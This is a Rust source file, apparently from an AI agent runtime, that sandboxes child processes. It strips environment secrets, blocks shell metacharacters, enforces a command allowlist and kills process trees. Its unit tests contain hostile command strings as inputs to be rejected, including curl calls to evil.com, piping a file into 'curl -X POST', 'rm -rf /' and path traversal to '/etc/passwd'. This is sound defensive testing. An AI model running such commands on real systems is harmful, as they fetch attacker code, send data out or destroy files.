//! Subprocess environment sandboxing.
//!
//! When the runtime spawns child processes (e.g. for the `shell` tool), we
//! must strip the inherited environment to prevent accidental leakage of
//! secrets (API keys, tokens, credentials) into untrusted code.
//!
//! This module provides helpers to:
//! - Clear the child's environment and re-add only a safe allow-list.
//! - Validate executable paths before spawning.

use std::path::Path;

/// Environment variables considered safe to inherit on all platforms.
pub const SAFE_ENV_VARS: &[&str] = &[
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "LANG", "LC_ALL", "TERM",
];

/// Additional environment variables considered safe on Windows.
#[cfg(windows)]
pub const SAFE_ENV_VARS_WINDOWS: &[&str] = &[
    "USERPROFILE",
    "SYSTEMROOT",
    "APPDATA",
    "LOCALAPPDATA",
    "COMSPEC",
    "WINDIR",
    "PATHEXT",
];

/// Sandboxes a `tokio::process::Command` by clearing its environment and
/// selectively re-adding only safe variables.
///
/// After calling this function the child process will only see:
/// - The platform-independent safe variables (`SAFE_ENV_VARS`)
/// - On Windows, the Windows-specific safe variables (`SAFE_ENV_VARS_WINDOWS`)
/// - Any additional variables the caller explicitly allows via `allowed_env_vars`
///
/// Variables that are not set in the current process environment are silently
/// skipped (rather than being set to empty strings).
pub fn sandbox_command(cmd: &mut tokio::process::Command, allowed_env_vars: &[String]) {
    cmd.env_clear();

    // Re-add platform-independent safe vars.
    for var in SAFE_ENV_VARS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add Windows-specific safe vars.
    #[cfg(windows)]
    for var in SAFE_ENV_VARS_WINDOWS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add caller-specified allowed vars.
    for var in allowed_env_vars {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
}

/// Validates that an executable path does not contain directory traversal
/// components (`..`).
///
/// This is a defence-in-depth check to prevent an agent from escaping its
/// working directory via crafted paths like `../../bin/dangerous`.
pub fn validate_executable_path(path: &str) -> Result<(), String> {
    let p = Path::new(path);
    for component in p.components() {
        if let std::path::Component::ParentDir = component {
            return Err(format!(
                "executable path '{}' contains '..' component which is not allowed",
                path
            ));
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Shell/exec allowlisting
// ---------------------------------------------------------------------------

use librefang_types::config::{ExecPolicy, ExecSecurityMode};

/// SECURITY: Check for shell metacharacters that enable command injection.
///
/// Blocks shell operators that can chain commands, redirect I/O,
/// perform substitution, or otherwise escape the intended command boundary.
/// This is a defense-in-depth layer — even with allowlist validation,
/// metacharacters must be rejected first to prevent injection.
///
/// Characters inside matched quotes (single or double) are treated as literal
/// arguments and are NOT flagged — only unquoted metacharacters are dangerous.
pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
    // First, check characters that are dangerous even inside quotes:
    // newlines and null bytes break the command boundary regardless of quoting.
    if command.contains('\n') || command.contains('\r') {
        return Some("embedded newline".to_string());
    }
    if command.contains('\0') {
        return Some("null byte".to_string());
    }

    // Scan only unquoted portions of the command for shell metacharacters.
    let unquoted = strip_quoted_regions(command);

    // ── Command substitution ──────────────────────────────────────────
    if unquoted.contains('`') {
        return Some("backtick command substitution".to_string());
    }
    if unquoted.contains("$(") {
        return Some("$() command substitution".to_string());
    }
    if unquoted.contains("${") {
        return Some("${} variable expansion".to_string());
    }

    // ── Command chaining ──────────────────────────────────────────────
    if unquoted.contains(';') {
        return Some("semicolon command chaining".to_string());
    }
    if unquoted.contains('|') {
        return Some("pipe operator".to_string());
    }

    // ── I/O redirection ───────────────────────────────────────────────
    if unquoted.contains('>') || unquoted.contains('<') {
        return Some("I/O redirection".to_string());
    }

    // ── Expansion and globbing ────────────────────────────────────────
    if unquoted.contains('{') || unquoted.contains('}') {
        return Some("brace expansion".to_string());
    }

    // ── Background execution and logical chaining ──────────────────────
    if unquoted.contains('&') {
        return Some("ampersand operator".to_string());
    }
    None
}

/// Replace quoted regions with spaces, preserving only unquoted characters.
///
/// Handles single quotes (`'...'`) and double quotes (`"..."`).
/// Backslash escapes inside double quotes are respected (`\"`).
/// Single quotes have no escape mechanism (POSIX behavior).
fn strip_quoted_regions(command: &str) -> String {
    let mut result = String::with_capacity(command.len());
    let chars: Vec<char> = command.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        match chars[i] {
            '\'' => {
                // Single-quoted region: skip until closing '
                i += 1;
                while i < len && chars[i] != '\'' {
                    i += 1;
                }
                if i < len {
                    i += 1; // skip closing '
                }
                result.push(' '); // placeholder
            }
            '"' => {
                // Double-quoted region: skip until unescaped closing "
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < len {
                        i += 2; // skip escaped char
                    } else {
                        i += 1;
                    }
                }
                if i < len {
                    i += 1; // skip closing "
                }
                result.push(' '); // placeholder
            }
            c => {
                result.push(c);
                i += 1;
            }
        }
    }

    result
}

/// Extract the base command name from a command string.
/// Handles paths (e.g., "/usr/bin/python3" → "python3").
fn extract_base_command(cmd: &str) -> &str {
    let trimmed = cmd.trim();
    // Take first word (space-delimited)
    let first_word = trimmed.split_whitespace().next().unwrap_or("");
    // Strip path prefix
    first_word
        .rsplit('/')
        .next()
        .unwrap_or(first_word)
        .rsplit('\\')
        .next()
        .unwrap_or(first_word)
}

/// Known shell wrappers that can execute inline scripts via flags.
const SHELL_WRAPPERS: &[&str] = &["powershell", "pwsh", "cmd", "bash", "sh", "zsh"];

/// Known flags that pass inline scripts to shell wrappers.
/// Each entry is (wrapper_names, flag).
const SHELL_INLINE_FLAGS: &[(&[&str], &str)] = &[
    (&["powershell", "pwsh"], "-Command"),
    (&["powershell", "pwsh"], "-command"),
    (&["powershell", "pwsh"], "-c"),
    (&["cmd"], "/c"),
    (&["cmd"], "/C"),
    (&["bash", "sh", "zsh"], "-c"),
    (&["bash", "sh", "zsh"], "--command"),
];

/// If the base command is a known shell wrapper, extract any inline script
/// passed via -Command / -c / /c flags and return the commands within it.
///
/// Returns the list of base command names found inside the inline script,
/// or an empty vec if the command is not a shell wrapper or has no inline flag.
fn extract_shell_wrapper_commands(command: &str) -> Vec<String> {
    let trimmed = command.trim();
    let base = extract_base_command(trimmed);

    // Check if the base command is a known shell wrapper (case-insensitive)
    let base_lower = base.to_lowercase();
    // Also strip .exe suffix for Windows
    let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
    if !SHELL_WRAPPERS.iter().any(|w| *w == base_normalized) {
        return Vec::new();
    }

    // Find the inline flag and extract everything after it
    for (wrappers, flag) in SHELL_INLINE_FLAGS {
        if !wrappers.iter().any(|w| *w == base_normalized) {
            continue;
        }
        // Search for the flag in the command args (case-insensitive for PowerShell)
        let rest = trimmed.split_whitespace().skip(1); // skip the base command
        let args: Vec<&str> = rest.collect();
        for (i, arg) in args.iter().enumerate() {
            if arg.eq_ignore_ascii_case(flag) {
                // Everything after this flag is the inline script
                if i + 1 < args.len() {
                    let script = args[i + 1..].join(" ");
                    // Strip surrounding quotes if present
                    let script = script.trim();
                    let script = if (script.starts_with('"') && script.ends_with('"'))
                        || (script.starts_with('\'') && script.ends_with('\''))
                    {
                        &script[1..script.len() - 1]
                    } else {
                        script
                    };
                    // Extract commands from the inline script
                    // For PowerShell, commands can be separated by `;`
                    // For POSIX shells, by `;`, `&&`, `||`, `|`
                    return extract_inner_script_commands(script);
                }
            }
        }
    }

    Vec::new()
}

/// Extract base command names from an inline script string.
/// Splits on `;`, `&&`, `||`, `|` and returns the base command of each segment.
fn extract_inner_script_commands(script: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut rest = script;
    while !rest.is_empty() {
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment = &rest[..earliest_pos];
        let base = extract_base_command(segment);
        if !base.is_empty() {
            commands.push(base.to_string());
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    commands
}

/// Extract all commands from a shell command string.
/// Handles pipes (`|`), semicolons (`;`), `&&`, and `||`.
fn extract_all_commands(command: &str) -> Vec<&str> {
    let mut commands = Vec::new();
    // Split on pipe, semicolon, &&, ||
    // We need to split carefully: first split on ; and &&/||, then on |
    let mut rest = command;
    while !rest.is_empty() {
        // Find the earliest separator
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment = &rest[..earliest_pos];
        let base = extract_base_command(segment);
        if !base.is_empty() {
            commands.push(base);
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    commands
}

/// Validate a shell command against the exec policy.
///
/// Returns `Ok(())` if the command is allowed, `Err(reason)` if blocked.
pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<(), String> {
    match policy.mode {
        ExecSecurityMode::Deny => {
            Err("Shell execution is disabled (exec_policy.mode = deny)".to_string())
        }
        ExecSecurityMode::Full => {
            tracing::warn!(
                command = crate::str_utils::safe_truncate_str(command, 100),
                "Shell exec in full mode — no restrictions"
            );
            Ok(())
        }
        ExecSecurityMode::Allowlist => {
            // SECURITY: Check for shell metacharacters BEFORE base-command extraction.
            // These can smuggle commands inside arguments of allowed binaries.
            //
            // However, we must skip this check for commands wrapped in a known
            // shell wrapper (e.g. `powershell -Command "..."`) because the
            // inline script naturally contains metacharacters (quotes, semicolons).
            // Those inner commands are validated separately below.
            let inner_commands = extract_shell_wrapper_commands(command);
            let is_shell_wrapper = !inner_commands.is_empty();

            if !is_shell_wrapper {
                if let Some(reason) = contains_shell_metacharacters(command) {
                    return Err(format!(
                        "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
                    ));
                }
            }

            let base_commands = extract_all_commands(command);
            for base in &base_commands {
                // Check safe_bins first
                if policy.safe_bins.iter().any(|sb| sb == base) {
                    continue;
                }
                // Check allowed_commands
                if policy.allowed_commands.iter().any(|ac| ac == base) {
                    continue;
                }
                return Err(format!(
                    "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                    base
                ));
            }

            // SECURITY: If the outer command is a shell wrapper
            // (powershell, cmd, bash, etc.), also validate all commands
            // found inside the inline script. This prevents bypassing the
            // allowlist by wrapping disallowed commands inside an allowed
            // shell.
            if is_shell_wrapper {
                for inner_cmd in &inner_commands {
                    if policy.safe_bins.iter().any(|sb| sb == inner_cmd) {
                        continue;
                    }
                    if policy.allowed_commands.iter().any(|ac| ac == inner_cmd) {
                        continue;
                    }
                    return Err(format!(
                        "Command '{}' (inside shell wrapper) is not in the exec allowlist. \
                         Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                        inner_cmd
                    ));
                }
            }

            Ok(())
        }
    }
}

// ---------------------------------------------------------------------------
// Process tree kill — cross-platform graceful → force kill
// ---------------------------------------------------------------------------

/// Default grace period before force-killing (milliseconds).
pub const DEFAULT_GRACE_MS: u64 = 3000;

/// Maximum grace period to prevent indefinite waits.
pub const MAX_GRACE_MS: u64 = 60_000;

/// Kill a process and all its children (process tree kill).
///
/// 1. Send graceful termination signal (SIGTERM on Unix, taskkill on Windows)
/// 2. Wait `grace_ms` for the process to exit
/// 3. If still running, force kill (SIGKILL on Unix, taskkill /F on Windows)
///
/// Returns `Ok(true)` if the process was killed, `Ok(false)` if it was already
/// dead, or `Err` if the kill operation itself failed.
pub async fn kill_process_tree(pid: u32, grace_ms: u64) -> Result<bool, String> {
    let grace = grace_ms.min(MAX_GRACE_MS);

    #[cfg(unix)]
    {
        kill_tree_unix(pid, grace).await
    }

    #[cfg(windows)]
    {
        kill_tree_windows(pid, grace).await
    }
}

/// Return true iff `pid` is the leader of its own process group
/// (i.e. `getpgid(pid) == pid`). Only group leaders are safe targets
/// for the `kill(-pgid, ...)` syntax — calling it on a non-leader
/// would blindly send the signal to whatever unrelated process group
/// happens to have `pid` as its PGID, which on shared runners can be
/// the actions-runner session itself.
#[cfg(unix)]
fn is_process_group_leader(pid: u32) -> bool {
    // SAFETY: `getpgid` is always safe to call; it only reads kernel
    // state and returns -1 with errno on error (which we map to false).
    let pgid = unsafe { libc::getpgid(pid as libc::pid_t) };
    pgid >= 0 && pgid as u32 == pid
}

#[cfg(unix)]
async fn kill_tree_unix(pid: u32, grace_ms: u64) -> Result<bool, String> {
    let pid_i32 = pid as i32;
    let is_leader = is_process_group_leader(pid);

    // Use direct libc::kill instead of Command::new("kill").
    // Spawning a `kill` subprocess forks a child that briefly exists
    // in the caller's process group before exec — on GitHub Actions
    // Ubuntu runners this fork races with PID recycling and can land
    // a signal on the runner's session leader (SIGTERM exit 143).
    // Direct syscall has no fork, no race.
    //
    // SAFETY: libc::kill only sends a signal and returns -1 on error.
    if is_leader {
        unsafe { libc::kill(-pid_i32, libc::SIGTERM) };
    } else {
        unsafe { libc::kill(pid_i32, libc::SIGTERM) };
    }

    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    let alive = unsafe { libc::kill(pid_i32, 0) } == 0;

    if alive {
        tracing::warn!(
            pid,
            is_leader,
            "Process still alive after grace period, sending SIGKILL"
        );
        if is_leader {
            unsafe { libc::kill(-pid_i32, libc::SIGKILL) };
        }
        unsafe { libc::kill(pid_i32, libc::SIGKILL) };
        Ok(true)
    } else {
        Ok(true)
    }
}

#[cfg(windows)]
async fn kill_tree_windows(pid: u32, grace_ms: u64) -> Result<bool, String> {
    use tokio::process::Command;

    // Try graceful kill first (taskkill /T = tree, no /F = graceful).
    let graceful = Command::new("taskkill")
        .args(["/T", "/PID", &pid.to_string()])
        .output()
        .await;

    match graceful {
        Ok(output) if output.status.success() => {
            // Graceful kill succeeded.
            return Ok(true);
        }
        _ => {}
    }

    // Wait grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive using tasklist.
    let check = Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .output()
        .await;

    let still_alive = match &check {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            stdout.contains(&pid.to_string())
        }
        Err(_) => true, // Assume alive if we can't check.
    };

    if still_alive {
        tracing::warn!(pid, "Process still alive after grace period, force killing");
        // Force kill the entire tree.
        let force = Command::new("taskkill")
            .args(["/F", "/T", "/PID", &pid.to_string()])
            .output()
            .await;

        match force {
            Ok(output) if output.status.success() => Ok(true),
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.contains("not found") || stderr.contains("no process") {
                    Ok(false) // Already dead.
                } else {
                    Err(format!("Force kill failed: {stderr}"))
                }
            }
            Err(e) => Err(format!("Failed to execute taskkill: {e}")),
        }
    } else {
        Ok(true)
    }
}

/// Kill a tokio child process with tree kill.
///
/// Extracts the PID from the `Child` handle and performs a tree kill.
/// This is the preferred way to clean up subprocesses spawned by LibreFang.
pub async fn kill_child_tree(
    child: &mut tokio::process::Child,
    grace_ms: u64,
) -> Result<bool, String> {
    match child.id() {
        Some(pid) => kill_process_tree(pid, grace_ms).await,
        None => Ok(false), // Process already exited.
    }
}

/// Wait for a child process with timeout, then kill if necessary.
///
/// Returns the exit status if the process exits within the timeout,
/// or kills the process tree and returns an error.
pub async fn wait_or_kill(
    child: &mut tokio::process::Child,
    timeout: std::time::Duration,
    grace_ms: u64,
) -> Result<std::process::ExitStatus, String> {
    match tokio::time::timeout(timeout, child.wait()).await {
        Ok(Ok(status)) => Ok(status),
        Ok(Err(e)) => Err(format!("Wait error: {e}")),
        Err(_) => {
            tracing::warn!("Process timed out after {:?}, killing tree", timeout);
            kill_child_tree(child, grace_ms).await?;
            Err(format!("Process timed out after {:?}", timeout))
        }
    }
}

/// Wait for a child process with dual timeout: absolute + no-output idle.
///
/// - `absolute_timeout`: Maximum total execution time.
/// - `no_output_timeout`: Kill if no stdout/stderr output for this duration (0 = disabled).
/// - `grace_ms`: Grace period before force-killing.
///
/// Returns the termination reason and output collected.
pub async fn wait_or_kill_with_idle(
    child: &mut tokio::process::Child,
    absolute_timeout: std::time::Duration,
    no_output_timeout: std::time::Duration,
    grace_ms: u64,
) -> Result<(librefang_types::config::TerminationReason, String), String> {
    use tokio::io::AsyncReadExt;

    let idle_enabled = !no_output_timeout.is_zero();
    let mut output = String::new();

    // Take stdout/stderr handles if available
    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();

    let deadline = tokio::time::Instant::now() + absolute_timeout;
    let mut idle_deadline = if idle_enabled {
        Some(tokio::time::Instant::now() + no_output_timeout)
    } else {
        None
    };

    let mut stdout_buf = [0u8; 4096];
    let mut stderr_buf = [0u8; 4096];

    loop {
        // Check absolute timeout
        if tokio::time::Instant::now() >= deadline {
            tracing::warn!("Process hit absolute timeout after {:?}", absolute_timeout);
            kill_child_tree(child, grace_ms).await?;
            return Ok((
                librefang_types::config::TerminationReason::AbsoluteTimeout,
                output,
            ));
        }

        // Check idle timeout
        if let Some(idle_dl) = idle_deadline {
            if tokio::time::Instant::now() >= idle_dl {
                tracing::warn!(
                    "Process produced no output for {:?}, killing",
                    no_output_timeout
                );
                kill_child_tree(child, grace_ms).await?;
                return Ok((
                    librefang_types::config::TerminationReason::NoOutputTimeout,
                    output,
                ));
            }
        }

        // Use a short poll interval
        let poll_duration = std::time::Duration::from_millis(100);

        tokio::select! {
            // Try to read stdout
            result = async {
                if let Some(ref mut out) = stdout {
                    out.read(&mut stdout_buf).await
                } else {
                    // No stdout — just sleep
                    tokio::time::sleep(poll_duration).await;
                    Ok(0)
                }
            } => {
                match result {
                    Ok(0) => {
                        // EOF on stdout — process may be done
                        stdout = None;
                        if stderr.is_none() {
                            // Both closed, wait for process exit
                            match tokio::time::timeout(
                                deadline.saturating_duration_since(tokio::time::Instant::now()),
                                child.wait(),
                            ).await {
                                Ok(Ok(status)) => {
                                    return Ok((
                                        librefang_types::config::TerminationReason::Exited(status.code().unwrap_or(-1)),
                                        output,
                                    ));
                                }
                                Ok(Err(e)) => return Err(format!("Wait error: {e}")),
                                Err(_) => {
                                    kill_child_tree(child, grace_ms).await?;
                                    return Ok((librefang_types::config::TerminationReason::AbsoluteTimeout, output));
                                }
                            }
                        }
                    }
                    Ok(n) => {
                        let text = String::from_utf8_lossy(&stdout_buf[..n]);
                        output.push_str(&text);
                        // Reset idle timer on output
                        if idle_enabled {
                            idle_deadline = Some(tokio::time::Instant::now() + no_output_timeout);
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Stdout read error: {e}");
                        stdout = None;
                    }
                }
            }
            // Try to read stderr
            result = async {
                if let Some(ref mut err) = stderr {
                    err.read(&mut stderr_buf).await
                } else {
                    tokio::time::sleep(poll_duration).await;
                    Ok(0)
                }
            } => {
                match result {
                    Ok(0) => {
                        stderr = None;
                    }
                    Ok(n) => {
                        let text = String::from_utf8_lossy(&stderr_buf[..n]);
                        output.push_str(&text);
                        // Reset idle timer on output
                        if idle_enabled {
                            idle_deadline = Some(tokio::time::Instant::now() + no_output_timeout);
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Stderr read error: {e}");
                        stderr = None;
                    }
                }
            }
            // Process exit
            result = child.wait() => {
                match result {
                    Ok(status) => {
                        return Ok((
                            librefang_types::config::TerminationReason::Exited(status.code().unwrap_or(-1)),
                            output,
                        ));
                    }
                    Err(e) => return Err(format!("Wait error: {e}")),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_path() {
        // Clean paths should be accepted.
        assert!(validate_executable_path("ls").is_ok());
        assert!(validate_executable_path("/usr/bin/python3").is_ok());
        assert!(validate_executable_path("./scripts/build.sh").is_ok());
        assert!(validate_executable_path("subdir/tool").is_ok());

        // Paths with ".." should be rejected.
        assert!(validate_executable_path("../bin/evil").is_err());
        assert!(validate_executable_path("/usr/../etc/passwd").is_err());
        assert!(validate_executable_path("foo/../../bar").is_err());
    }

    #[test]
    fn test_grace_constants() {
        assert_eq!(DEFAULT_GRACE_MS, 3000);
        assert_eq!(MAX_GRACE_MS, 60_000);
    }

    #[test]
    fn test_grace_ms_capped() {
        // Verify the capping logic used in kill_process_tree.
        let capped = 100_000u64.min(MAX_GRACE_MS);
        assert_eq!(capped, 60_000);
    }

    #[tokio::test]
    async fn test_kill_nonexistent_process() {
        // Killing a non-existent PID should not panic.
        // Use a very high PID unlikely to exist.
        let result = kill_process_tree(999_999, 100).await;
        // Result depends on platform, but must not panic.
        let _ = result;
    }

    #[tokio::test]
    async fn test_kill_child_tree_exited_process() {
        use tokio::process::Command;

        // Spawn a process that exits immediately.
        let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
            .args(if cfg!(windows) {
                vec!["/C", "echo done"]
            } else {
                vec![]
            })
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn");

        // Wait for it to finish.
        let _ = child.wait().await;

        // Now try to kill — should return Ok(false) since already exited.
        let result = kill_child_tree(&mut child, 100).await;
        assert!(result.is_ok());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_is_process_group_leader_distinguishes_own_group_from_inherited_group() {
        // Regression for the ubuntu-CI flake investigated in
        // librefang/librefang#2464: `kill_tree_unix` used to blindly
        // call `kill(-pid, SIGTERM)` which only makes sense for
        // process-group leaders. When the child inherited the test
        // binary's pgid, that negative-PID form targeted whichever
        // unrelated process group happened to be led by a process
        // whose PID equalled the child's — occasionally the actions-
        // runner session leader itself, killing the whole job.
        //
        // This test exercises both branches of the helper:
        //  (a) child spawned WITHOUT `process_group(0)` — inherits the
        //      test binary's pgid, so `pgid != pid` and the helper
        //      must return false;
        //  (b) child spawned WITH `process_group(0)` — becomes its own
        //      group leader, so `pgid == pid` and the helper must
        //      return true.
        use tokio::process::Command;

        let mut inherited = Command::new("sleep")
            .arg("10")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("spawn inherited-pgid sleep");
        let inherited_pid = inherited.id().expect("inherited pid");
        assert!(
            !is_process_group_leader(inherited_pid),
            "a child that inherits the parent pgid must NOT look like a group leader"
        );
        inherited.kill().await.ok();
        inherited.wait().await.ok();

        let mut owned = Command::new("sleep")
            .arg("10")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .process_group(0)
            .spawn()
            .expect("spawn own-pgid sleep");
        let owned_pid = owned.id().expect("owned pid");
        assert!(
            is_process_group_leader(owned_pid),
            "a child spawned with process_group(0) must be its own group leader"
        );
        owned.kill().await.ok();
        owned.wait().await.ok();
    }

    #[cfg(unix)]
    #[test]
    fn test_is_process_group_leader_rejects_nonexistent_pid() {
        // Very high PID guaranteed not to exist — `getpgid` returns -1,
        // helper must say "not a leader" so the caller falls back to
        // the single-PID kill path.
        assert!(!is_process_group_leader(999_999));
    }

    #[tokio::test]
    async fn test_wait_or_kill_fast_process() {
        use tokio::process::Command;

        let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
            .args(if cfg!(windows) {
                vec!["/C", "echo done"]
            } else {
                vec![]
            })
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn");

        let result = wait_or_kill(&mut child, std::time::Duration::from_secs(5), 100).await;
        assert!(result.is_ok());
    }

    // ── Exec policy tests ──────────────────────────────────────────────

    #[test]
    fn test_extract_base_command() {
        assert_eq!(extract_base_command("ls -la"), "ls");
        assert_eq!(
            extract_base_command("/usr/bin/python3 script.py"),
            "python3"
        );
        assert_eq!(extract_base_command("  echo hello  "), "echo");
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn test_extract_all_commands_simple() {
        let cmds = extract_all_commands("ls -la");
        assert_eq!(cmds, vec!["ls"]);
    }

    #[test]
    fn test_extract_all_commands_piped() {
        let cmds = extract_all_commands("cat file.txt | grep foo | sort");
        assert_eq!(cmds, vec!["cat", "grep", "sort"]);
    }

    #[test]
    fn test_extract_all_commands_and_or() {
        let cmds = extract_all_commands("mkdir dir && cd dir || echo fail");
        assert_eq!(cmds, vec!["mkdir", "cd", "echo"]);
    }

    #[test]
    fn test_extract_all_commands_semicolons() {
        let cmds = extract_all_commands("echo a; echo b; echo c");
        assert_eq!(cmds, vec!["echo", "echo", "echo"]);
    }

    #[test]
    fn test_deny_mode_blocks() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Deny,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("ls", &policy).is_err());
        assert!(validate_command_allowlist("echo hi", &policy).is_err());
    }

    #[test]
    fn test_full_mode_allows_everything() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("rm -rf /", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_permits_safe_bins() {
        let policy = ExecPolicy::default();
        // Default safe_bins include "echo", "cat", "sort"
        assert!(validate_command_allowlist("echo hello", &policy).is_ok());
        assert!(validate_command_allowlist("cat file.txt", &policy).is_ok());
        assert!(validate_command_allowlist("sort data.csv", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_blocks_unlisted() {
        let policy = ExecPolicy::default();
        // "curl" is not in default safe_bins or allowed_commands
        assert!(validate_command_allowlist("curl https://evil.com", &policy).is_err());
        assert!(validate_command_allowlist("rm -rf /", &policy).is_err());
    }

    #[test]
    fn test_allowlist_allowed_commands() {
        let policy = ExecPolicy {
            allowed_commands: vec!["cargo".to_string(), "git".to_string()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("cargo build", &policy).is_ok());
        assert!(validate_command_allowlist("git status", &policy).is_ok());
        assert!(validate_command_allowlist("npm install", &policy).is_err());
    }

    #[test]
    fn test_piped_command_blocked_by_metachar() {
        let policy = ExecPolicy::default();
        // SECURITY: Pipes are now blocked at the metacharacter layer, before allowlist
        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_err());
        assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
    }

    #[test]
    fn test_default_policy_works() {
        let policy = ExecPolicy::default();
        assert_eq!(policy.mode, ExecSecurityMode::Allowlist);
        assert!(!policy.safe_bins.is_empty());
        assert!(policy.safe_bins.contains(&"echo".to_string()));
        assert!(policy.allowed_commands.is_empty());
        assert_eq!(policy.timeout_secs, 30);
        assert_eq!(policy.max_output_bytes, 100 * 1024);
    }

    // ── Shell metacharacter injection tests ──────────────────────────────

    #[test]
    fn test_metachar_backtick_blocked() {
        assert!(contains_shell_metacharacters("echo `whoami`").is_some());
        assert!(contains_shell_metacharacters("cat `curl evil.com`").is_some());
    }

    #[test]
    fn test_metachar_dollar_paren_blocked() {
        assert!(contains_shell_metacharacters("echo $(id)").is_some());
        assert!(contains_shell_metacharacters("echo $(rm -rf /)").is_some());
    }

    #[test]
    fn test_metachar_dollar_brace_blocked() {
        assert!(contains_shell_metacharacters("echo ${HOME}").is_some());
        assert!(contains_shell_metacharacters("echo ${SHELL}").is_some());
    }

    #[test]
    fn test_metachar_background_amp_blocked() {
        assert!(contains_shell_metacharacters("sleep 100 &").is_some());
        assert!(contains_shell_metacharacters("curl evil.com & echo ok").is_some());
    }

    #[test]
    fn test_metachar_double_amp_blocked() {
        // SECURITY: && is now blocked — command chaining via logical AND is dangerous
        assert!(contains_shell_metacharacters("echo a && echo b").is_some());
    }

    #[test]
    fn test_metachar_newline_blocked() {
        assert!(contains_shell_metacharacters("echo hello\nmkdir evil").is_some());
        assert!(contains_shell_metacharacters("echo ok\r\ncurl bad").is_some());
    }

    #[test]
    fn test_metachar_process_substitution_blocked() {
        assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
        assert!(contains_shell_metacharacters("tee >(cat)").is_some());
    }

    #[test]
    fn test_metachar_clean_command_ok() {
        assert!(contains_shell_metacharacters("ls -la").is_none());
        assert!(contains_shell_metacharacters("cat file.txt").is_none());
        assert!(contains_shell_metacharacters("echo hello world").is_none());
    }

    #[test]
    fn test_metachar_inside_single_quotes_ok() {
        // Characters inside single quotes are literal, not shell operators
        assert!(contains_shell_metacharacters("echo 'a > b'").is_none());
        assert!(contains_shell_metacharacters("echo 'hello | world'").is_none());
        assert!(contains_shell_metacharacters("echo '{foo}'").is_none());
        assert!(contains_shell_metacharacters("python3 -c 'if x > 0: print(x)'").is_none());
    }

    #[test]
    fn test_metachar_inside_double_quotes_ok() {
        // Characters inside double quotes are literal (for our purposes)
        assert!(contains_shell_metacharacters(r#"echo "a > b""#).is_none());
        assert!(contains_shell_metacharacters(r#"echo "hello | world""#).is_none());
        assert!(contains_shell_metacharacters(r#"python3 -c "if x > 0: print(x)""#).is_none());
        assert!(contains_shell_metacharacters(r#"echo "a && b""#).is_none());
    }

    #[test]
    fn test_metachar_escaped_quote_in_double_quotes() {
        // Escaped quote inside double quotes should not end the quoted region
        assert!(contains_shell_metacharacters(r#"echo "say \"hello > world\"""#).is_none());
    }

    #[test]
    fn test_metachar_unquoted_still_blocked() {
        // Metacharacters outside quotes must still be blocked
        assert!(contains_shell_metacharacters("echo 'safe' > output.txt").is_some());
        assert!(contains_shell_metacharacters("echo 'ok' | grep x").is_some());
        assert!(contains_shell_metacharacters("echo 'a' && echo 'b'").is_some());
    }

    #[test]
    fn test_metachar_newline_blocked_even_in_quotes() {
        // Newlines are dangerous even inside quotes (break command boundary)
        assert!(contains_shell_metacharacters("echo 'hello\nworld'").is_some());
